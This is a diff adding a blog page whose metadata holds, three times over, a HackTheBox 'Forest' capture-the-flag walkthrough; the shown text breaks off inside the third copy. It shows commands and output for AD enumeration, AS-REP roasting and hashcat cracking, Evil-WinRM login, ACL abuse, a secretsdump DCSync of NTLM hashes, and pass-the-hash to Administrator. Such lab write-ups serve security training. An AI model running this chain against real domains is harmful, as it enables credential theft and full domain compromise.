@@ -1,0 +1,1019 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
+<!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>HackTheBox Forest | DC0deZer0</title>
+<meta name="generator" content="Jekyll v4.2.0">
+<meta property="og:title" content="HackTheBox Forest">
+<meta name="author" content="Jeevan Chandra">
+<meta property="og:locale" content="en_US">
+<meta name="description" content='Let’s get started As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.031s latency). Not shown: 64742 closed ports, 769 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49697/tcp open unknown 49898/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT Nmap scan report for 10.10.10.161 Host is up (0.030s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version SF:\x04bind\0\0\x10\0\x03"); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-14T11:34:51-07:00 | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-14T18:34:52 |_ start_date: 2019-10-14T09:52:45 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.091s latency). Not shown: 65457 open|filtered ports, 74 closed ports PORT STATE SERVICE 123/udp open ntp 389/udp open ldap 58399/udp open unknown 58507/udp open unknown Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds Finding Users in the domain I used RPCCLIENT to find the users in the domain #rpcclient 10.10.10.161 -U% rpcclient $&gt; enumdom enumdomains enumdomgroups enumdomusers rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Getting TGT Getting the TGT from the list of users found from RPCCLIENT using IMPACKET SCRIPTS. python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco There are a bunch of ways to use impacket-scripts, so we can use the below options as well. Options: htb.local - is the domain name we extracted from the nmap output -usersfile - the list of users we want to test aginst // we extracted from enum4linux output -format hashcat - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt -outputfile - the place to put the output in -dc-ip - the domain controller IP address we get the hash of the user SVC-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb Cracking the hash Now it’s time to crack the hash of the user SVC-alfresco hashcat -m18200 hash.txt /usr/share/wordlists/rockyou.txt $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice As the password is found, I proceed with using Evil-Winrm to gain the foothold of the machine Getting User.txt evil-winrm -i forest.htb -u svc-alfresco -p s3rvice Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; *Evil-WinRM* PS C:\Users\svc-alfresco\desktop&gt; type user.txt [e*******************************] privileges Escalation From svc-alfresco to Administrator Using bloodhound to find some intresting stuff BloodHound Result Shows Svc-Alfresco can WriteDacl to HTB.local that Contains administrator@htb.local. Useful link for priv esc https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ No it’s time to abuse the AD… net group “Exchange Windows Permissions” svc-alfresco /add /domain python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: So as we found the hash of the Administrator of the domain, we can now use Pass the hash to gain the Shell of Administrator. Getting Root.txt evil-winrm -i forest.htb -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami htb\administrator C:\users\administrator\desktop&gt;type root.txt [f*******************************] If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968'>
+<meta property="og:description" content='Let’s get started As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.031s latency). Not shown: 64742 closed ports, 769 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49697/tcp open unknown 49898/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT Nmap scan report for 10.10.10.161 Host is up (0.030s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version SF:\x04bind\0\0\x10\0\x03"); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-14T11:34:51-07:00 | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-14T18:34:52 |_ start_date: 2019-10-14T09:52:45 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.091s latency). Not shown: 65457 open|filtered ports, 74 closed ports PORT STATE SERVICE 123/udp open ntp 389/udp open ldap 58399/udp open unknown 58507/udp open unknown Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds Finding Users in the domain I used RPCCLIENT to find the users in the domain #rpcclient 10.10.10.161 -U% rpcclient $&gt; enumdom enumdomains enumdomgroups enumdomusers rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Getting TGT Getting the TGT from the list of users found from RPCCLIENT using IMPACKET SCRIPTS. python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco There are a bunch of ways to use impacket-scripts, so we can use the below options as well. Options: htb.local - is the domain name we extracted from the nmap output -usersfile - the list of users we want to test aginst // we extracted from enum4linux output -format hashcat - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt -outputfile - the place to put the output in -dc-ip - the domain controller IP address we get the hash of the user SVC-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb Cracking the hash Now it’s time to crack the hash of the user SVC-alfresco hashcat -m18200 hash.txt /usr/share/wordlists/rockyou.txt $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice As the password is found, I proceed with using Evil-Winrm to gain the foothold of the machine Getting User.txt evil-winrm -i forest.htb -u svc-alfresco -p s3rvice Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt; *Evil-WinRM* PS C:\Users\svc-alfresco\desktop&gt; type user.txt [e*******************************] privileges Escalation From svc-alfresco to Administrator Using bloodhound to find some intresting stuff BloodHound Result Shows Svc-Alfresco can WriteDacl to HTB.local that Contains administrator@htb.local. Useful link for priv esc https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ No it’s time to abuse the AD… net group “Exchange Windows Permissions” svc-alfresco /add /domain python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: So as we found the hash of the Administrator of the domain, we can now use Pass the hash to gain the Shell of Administrator. Getting Root.txt evil-winrm -i forest.htb -u Administrator -p aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami htb\administrator C:\users\administrator\desktop&gt;type root.txt [f*******************************] If you like my work, please do consider giving me +rep on HACKTHEBOX. My HackTheBox profile: https://www.hackthebox.eu/home/users/profile/291968'>
+<link rel="canonical" href="https://jeevanachandra.github.io//hackthebox/retired/2020/04/19/Forest.html">
+<meta property="og:url" content="https://jeevanachandra.github.io//hackthebox/retired/2020/04/19/Forest.html">
+<meta property="og:site_name" content="DC0deZer0">
+<meta property="og:image" content="https://jeevanachandra.github.io//assets/img/sample/forest.png">
+<meta property="og:type" content="article">
+<meta property="article:published_time" content="2020-04-19T22:09:00+05:30">
+<meta name="twitter:card" content="summary_large_image">
+<meta property="twitter:image" content="https://jeevanachandra.github.io//assets/img/sample/forest.png">
+<meta property="twitter:title" content="HackTheBox Forest">
+<script type="application/ld+json">
+{"description":"Let’s get started As always hacking starts with NMAP scan. Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:22 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.031s latency). Not shown: 64742 closed ports, 769 filtered ports PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown 49678/tcp open unknown 49697/tcp open unknown 49898/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 20.35 seconds root@kali# nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA scans/nmap-tcpscripts 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:24 EDT Nmap scan report for 10.10.10.161 Host is up (0.030s latency). PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-14 18:32:33Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=10/14%Time=5DA4BD82%P=x86_64-pc-linux-gnu%r(DNS SF:VersionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version SF:\\x04bind\\0\\0\\x10\\0\\x03&quot;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h27m32s, deviation: 4h02m30s, median: 7m31s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2019-10-14T11:34:51-07:00 | smb-security-mode: | account_used: &lt;blank&gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2019-10-14T18:34:52 |_ start_date: 2019-10-14T09:52:45 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 281.19 seconds root@kali# nmap -sU -p- --min-rate 10000 -oA scans/nmap-alludp 10.10.10.161 Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-14 14:30 EDT Warning: 10.10.10.161 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.10.161 Host is up (0.091s latency). Not shown: 65457 open|filtered ports, 74 closed ports PORT STATE SERVICE 123/udp open ntp 389/udp open ldap 58399/udp open unknown 58507/udp open unknown Nmap done: 1 IP address (1 host up) scanned in 73.74 seconds Finding Users in the domain I used RPCCLIENT to find the users in the domain #rpcclient 10.10.10.161 -U% rpcclient $&gt; enumdom enumdomains enumdomgroups enumdomusers rpcclient $&gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] user:[$331000-VK4ADACQNUCA] rid:[0x463] user:[SM_2c8eef0a09b545acb] rid:[0x464] user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465] user:[SM_75a538d3025e4db9a] rid:[0x466] user:[SM_681f53d4942840e18] rid:[0x467] user:[SM_1b41c9286325456bb] rid:[0x468] user:[SM_9b69f1b9d2cc45549] rid:[0x469] user:[SM_7c96b981967141ebb] rid:[0x46a] user:[SM_c75ee099d0a64c91b] rid:[0x46b] user:[SM_1ffab36a2f5f479cb] rid:[0x46c] user:[HealthMailboxc3d7722] rid:[0x46e] user:[HealthMailboxfc9daad] rid:[0x46f] user:[HealthMailboxc0a90c9] rid:[0x470] user:[HealthMailbox670628e] rid:[0x471] user:[HealthMailbox968e74d] rid:[0x472] user:[HealthMailbox6ded678] rid:[0x473] user:[HealthMailbox83d6781] rid:[0x474] user:[HealthMailboxfd87238] rid:[0x475] user:[HealthMailboxb01ac64] rid:[0x476] user:[HealthMailbox7108a4e] rid:[0x477] user:[HealthMailbox0659cc1] rid:[0x478] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] Getting TGT Getting the TGT from the list of users found from RPCCLIENT using IMPACKET SCRIPTS. python GetNPUsers.py -no-pass -k -dc-ip 10.10.10.161 htb.local/svc-alfresco There are a bunch of ways to use impacket-scripts, so we can use the below options as well. Options: htb.local - is the domain name we extracted from the nmap output -usersfile - the list of users we want to test aginst // we extracted from enum4linux output -format hashcat - tells the tool to set the hash (if exists) to hashcat format so we crank it easilt -outputfile - the place to put the output in -dc-ip - the domain controller IP address we get the hash of the user SVC-alfresco $krb5asrep$23$svc-alfresco@HTB.LOCAL:14c0bc63892470b5a2246ad5456d61f8$11340938cc2f5070bce088816b5a70abb614dcceeaafb99e59788bb288b0b3ad0231b46ec4603d9ebac192028e8d7ac1042cedc80d38c048ba2e8a881f26c0d94d267a52cc59194f4c7b08bef5256198f73e3e9a60c3aa6f92623c12e0b7c4a425edbfbe72561eb97142c8853dea7f532589e7e03d61bbccddaff66bad8d4e1039384ceb364c9d95c1a6828fc9eb232a176f44c44844eed8d9eecf208e22617a46ee61881f9bfda2ab3b67428a43d76798299cda3de9b279b88e8d34e40ab62846252050d6c48870527f1208bf1fb67f17452b0813358c8cefb0df724ce323ba39e212065cbb Cracking the hash Now it’s time to crack the hash of the user SVC-alfresco hashcat -m18200 hash.txt /usr/share/wordlists/rockyou.txt $krb5asrep$23$svc-alfresco@HTB:37a6233a6b2606aa39b55bff58654d5f$87335c1c890ae91dbd9a254a8ae27c06348f19754935f74473e7a41791ae703b95ed09580cc7b3ab80e1037ca98a52f7d6abd8732b2efbd7aae938badc90c5873af05eadf8d5d124a964adfb35d894c0e3b48$5f8a8b31f369d86225d3d53250c63b7220ce699efdda2c7d77598b6286b7ed1086dda0a19a21ef7881ba2b249a022adf9dc846785008408413e71ae008caf00fabbfa872c8657dc3ac82b4148563ca910ae72b8ac30bcea512fb94d78734f38ae7be1b73f8bae0bbfb49e6d61dc9d06d055004d29e7484cf0991953a4936c572df9d92e2ef86b5282877d07c38:s3rvice As the password is found, I proceed with using Evil-Winrm to gain the foothold of the machine Getting User.txt evil-winrm -i forest.htb -u svc-alfresco -p s3rvice Info: Starting Evil-WinRM shell v1.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; *Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop&gt; type user.txt [e*******************************] privileges Escalation From svc-alfresco to Administrator Using bloodhound to find some intresting stuff BloodHound Result Shows Svc-Alfresco can WriteDacl to HTB.local that Contains administrator@htb.local. Useful link for priv esc https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/ No it’s time to abuse the AD… net group “Exchange Windows Permissions” svc-alfresco /add /domain python3 secretsdump.py htb.local/svc-alfresco:s3rvice@10.10.10.161 Impacket v0.9.19-dev - Copyright 2018 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: htb.local\\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: So as we found the hash of the Administrator of the domain, we can now use Pass the hash to gain the Shell of Administrator. Getting Root.txt evil-winrm -i forest.htb -u Administrator -p 